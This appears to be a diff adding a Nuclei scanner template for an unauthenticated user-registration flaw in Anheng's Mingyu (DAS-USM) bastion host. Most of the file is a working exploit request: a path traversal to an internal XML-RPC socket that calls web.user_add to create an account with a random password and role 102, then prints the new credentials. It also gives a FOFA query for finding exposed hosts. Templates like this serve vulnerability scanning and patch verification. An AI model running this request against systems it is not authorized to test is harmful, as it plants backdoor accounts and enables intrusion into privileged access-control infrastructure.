@@ -1,0 +1,123 @@
+id: anheng-das-usm-useradd
+
+info:
+  name: 安恒信息-明御运维审计与风险控制系统 - useradd
+  author: SleepingBag945
+  severity: critical
+  description: 安恒明御堡垒机 /service/ 任意用户注册漏洞，该漏洞指在用户身份验证过程中存在的安全缺陷，这些缺陷可能导致攻击者能够绕过正常的认证机制，未授权地访问或操作用户的账户。
+  reference:
+    - changting
+    - dddd
+    - https://github.com/projectdiscovery/nuclei-templates/blob/c32e99fff059e189dc5b5a684c56c01785312dcc/http/misconfiguration/mingyu-xmlrpc-sock-adduser.yaml#L25
+  metadata:
+    verified: true
+    fofa-query: body="明御运维审计与风险控制系统"
+    repair: 建议尽快联系供应商获取升级信息，进行版本升级 https://www.dbappsecurity.com.cn/product/cloud157.html
+  tags: das,anheng,useradd,iot
+
+variables:
+  username: "{{rand_base(6)}}"
+  password: "{{rand_base(8)}}"
+  random: "{{rand_base(4)}}"
+
+http:
+  - raw:
+      - |
+        POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://{{random}}/wsrpc HTTP/1.1
+        Host: {{Hostname}}
+
+        <?xml version="1.0"?>
+        <methodCall>
+        <methodName>web.user_add</methodName>
+        <params>
+        <param>
+        <value>
+        <array>
+        <data>
+        <value>
+        <string>admin</string>
+        </value>
+        <value>
+        <string>5</string>
+        </value>
+        <value>
+        <string>10.0.0.1</string>
+        </value>
+        </data>
+        </array>
+        </value>
+        </param>
+        <param>
+        <value>
+        <struct>
+        <member>
+        <name>uname</name>
+        <value>
+        <string>{{username}}</string>
+        </value>
+        </member>
+        <member>
+        <name>name</name>
+        <value>
+        <string>{{username}}</string>
+        </value>
+        </member>
+        <member>
+        <name>pwd</name>
+        <value>
+        <string>{{password}}</string>
+        </value>
+        </member>
+        <member>
+        <name>authmode</name>
+        <value>
+        <string>1</string>
+        </value>
+        </member>
+        <member>
+        <name>deptid</name>
+        <value>
+        <string></string>
+        </value>
+        </member>
+        <member>
+        <name>email</name>
+        <value>
+        <string></string>
+        </value>
+        </member>
+        <member>
+        <name>mobile</name>
+        <value>
+        <string></string>
+        </value>
+        </member>
+        <member>
+        <name>comment</name>
+        <value>
+        <string></string>
+        </value>
+        </member>
+        <member>
+        <name>roleid</name>
+        <value>
+        <string>102</string>
+        </value>
+        </member>
+        </struct></value>
+        </param>
+        </params>
+        </methodCall>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(header, "text/xml") && contains(body, "rolename") && contains(body, "authmode")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"USERNAME: "+ username'
+          - '"PASSWORD: "+ password'
